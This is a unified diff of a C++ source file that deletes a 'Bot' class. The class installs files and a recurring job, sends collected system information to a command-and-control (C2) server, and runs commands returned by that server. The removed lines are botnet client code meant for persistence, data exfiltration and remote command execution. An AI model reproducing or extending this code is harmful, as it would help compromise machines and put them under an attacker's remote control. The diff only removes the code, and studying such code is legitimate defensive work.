@@ -17,38 +17,6 @@
 
 namespace fs = std::experimental::filesystem;
 
-// Initialize auth file and object to collect system info
-Bot::Bot(const fs::path& install_dir) {
-    install_ = std::make_unique<Installer>(install_dir);
-    std::string auth_hash = install_->GetAuthHash();
-    sysinfo_ = std::make_unique<sysinfo::DataList>(auth_hash);
-}
-
-bool Bot::IsNew() { return install_->IsNew(); }
-
-// Install files and components
-void Bot::Install() {
-    install_->InstallFiles();
-    install_->InitRecurringJob();
-}
-
-// Register bot with C2 server
-void Bot::RegisterBot(const std::string& register_url) {
-    // Create POST form from sysinfo_ and send it to C2 server
-    std::string data = sysinfo_->GetPostData();
-    request::Post(register_url, data);
-}
-
-void Bot::ExecuteCommand(const std::string& command_url) {
-    // Create POST form from sysinfo_ and send it to C2 server
-    std::string data = sysinfo_->GetPostData();
-    std::string response = request::Post(command_url, data);
-
-    // Parse JSON response from C2 server and execute command
-    Command cmd(response);
-    cmd.Execute();
-}
-
 bool LocalFileDep::Retrieve() {
     if (name.empty() or path.empty()) return false;
 
